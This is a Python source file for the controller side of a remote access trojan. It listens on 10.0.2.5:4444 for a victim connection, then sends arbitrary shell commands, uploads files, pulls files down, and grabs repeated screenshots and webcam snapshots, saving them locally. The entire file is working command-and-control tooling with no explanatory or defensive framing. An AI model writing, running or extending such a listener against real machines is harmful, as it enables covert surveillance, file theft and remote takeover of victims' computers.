import socket
import json
import base64
import simplejson
import time
import threading
from queue import Queue
import tqdm


class SocketListener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(5)
        print("Listening....")
        (self.connection, address) = listener.accept()
        print("Connection Established.. from " + str(address))

    def send_json(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1048576).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, Input):
        self.send_json(Input)
        if Input[0] == "quit":
            self.connection.close()
            exit(0)

        return self.json_recieve()

    def save_file(self, path, contents):
        with open(path, "wb") as file:
            print("Downloading......")
            file.write(base64.b64decode(contents))
            return "Download Completed !!"

    def save_screenshot(self, path, contents):
        with open(path, "wb") as file:
            file.write(base64.b64decode(contents))
            return "ScreenShot Saved !!"

    def save_snap(self, path, contents):
        with open(path, "wb") as file:
            file.write(base64.b64decode(contents))
            return "Snap Saved !!"

    def screenshot_loop(self,sleep, n):
        i=0
        output= ""
        print("Getting Screenshots ....")
        while(i<n):
            content = self.json_recieve()
            output = self.save_screenshot(f"screen{i}.png", content)
            i+=1
        return output

    def snap_loop(self,sleep, n):
        i=0
        output= ""
        print("Getting Snapshots ....")
        while(i<n):
            content = self.json_recieve()
            output = self.save_snap(f"snap{i}.jpg", content)
            i+=1
        return output


    def get_file_content(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def startListener(self):
        while True:
            Input = input("Enter Command: ")
            Input = Input.split(" ")
            try:
                if Input[0] == "upload":
                    file_content = self.get_file_content(Input[1])
                    Input.append(file_content)
                    print("Uploading.......")
                    Output = self.command_execution(Input)
                elif Input[0] == "screenshot" and len(Input) > 2:
                    self.send_json(Input)
                    Output = self.screenshot_loop(int(Input[1]), int(Input[2]))
                    Output = self.json_recieve()
                elif Input[0] == "webcam_snap" :
                    self.send_json(Input)
                    Output = self.snap_loop(int(Input[1]), int(Input[2]))
                    Output = self.json_recieve()
                else:
                    Output = self.command_execution(Input)
                    if Input[0] == "download" and "Error !!" not in Output:
                        Output = self.save_file(Input[1], Output)
                    if Input[0] == "screenshot" and "Error !!" not in Output and len(Input)<2:
                        Output = self.save_screenshot("screenshot.png", Output)

            except Exception:
                Output = "Error !!"
            print(Output)


Socket_Listener = SocketListener("10.0.2.5", 4444)
Socket_Listener.startListener()
